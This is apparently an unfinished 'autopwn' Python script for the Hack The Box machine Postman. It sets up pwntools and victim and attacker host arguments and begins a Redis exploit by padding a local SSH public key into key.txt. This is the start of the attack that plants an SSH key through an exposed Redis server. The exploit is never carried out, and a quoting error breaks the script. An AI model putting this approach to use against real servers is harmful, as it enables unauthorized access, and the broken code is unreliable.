#!/usr/bin/python3
import sys, time, subprocess, threading, signal, requests, string, argparse, warnings
from pwn import *

warnings.filterwarnings("ignore")

# Set handler for async events
def def_handler(sig, frame):
    print("\n[!] Quitting ...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Redis-cli exploit
def redis_exploit(rhost):
    try:
        # using subprocess to run bash script on python
        p1 = log.process("generating id_rsa.pub > key.txt") 
        keygen = "(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt"
        process = subprocess.Popen(keygen.split(), stdout=subprocess.PIPE)
        output, error = process.communicate()
        p1.success("key.txt generated!")
        time.sleep(2)
        # Query the redis CLI
    except:
        print("\n[*] An error has occured ...")








# execute here
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='autopwn script for postman'
    )

    parser.add_argument(
    '--rhost',
    action='store',
    dest='rhost',
    help='remote ip of the HTB machine (victim)'
    )  

    parser.add_argument(
    '--lhost',
    action='store',
    dest='lhost',
    help='Local host ip address (attacker)'
    )  

    parser.add_argument(
    '--lport',
    action='store',
    dest='lport',
    help='Local port of the ip address (attacker)'
    )  

    # create args to be passed
    args = parser.parse_args()
    
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    




